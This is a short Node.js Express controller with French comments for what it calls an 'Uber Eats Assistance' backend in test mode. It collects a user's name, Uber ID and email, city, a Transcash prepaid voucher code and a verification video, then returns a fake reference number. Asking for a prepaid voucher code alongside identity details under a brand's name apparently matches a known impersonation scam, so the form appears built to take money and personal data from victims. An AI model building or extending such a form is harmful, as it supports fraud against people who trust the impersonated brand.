const fs = require('fs');
const path = require('path');

/**
 * Contrôleur pour soumettre le formulaire - VERSION TEST SANS EMAIL/PDF
 */
const submitForm = async (req, res) => {
  try {
    console.log('✅ Formulaire reçu !');
    console.log('👤 Nom:', req.body.fullName);
    console.log('📧 Email:', req.body.uberEmail);
    console.log('📹 Vidéo:', req.file ? req.file.filename : 'Aucune');
    
    // Vérifier les données requises
    const { fullName, uberId, uberEmail, city, transcashCode, situation } = req.body;
    
    if (!fullName || !uberId || !uberEmail || !city || !transcashCode || !situation) {
      return res.status(400).json({
        error: 'Tous les champs sont requis'
      });
    }
    
    if (!req.file) {
      return res.status(400).json({
        error: 'La vidéo de vérification est requise'
      });
    }
    
    // ✅ RÉPONSE DE SUCCÈS IMMÉDIATE (PAS D'EMAIL/PDF)
    res.status(200).json({
      success: true,
      message: 'Votre demande a été reçue avec succès !',
      reference: `UE-${Date.now().toString().slice(-6)}`,
      data: {
        fullName,
        uberId,
        uberEmail,
        city,
        transcashCode,
        situation
      },
      video: req.file.filename,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('❌ ERREUR:', error);
    res.status(500).json({ 
      error: error.message 
    });
  }
};

/**
 * Route de santé
 */
const healthCheck = (req, res) => {
  res.status(200).json({
    status: 'healthy',
    service: 'Uber Eats Assistance Backend - Test Mode',
    timestamp: new Date().toISOString(),
    version: '1.0.0'
  });
};

module.exports = {
  submitForm,
  healthCheck
};
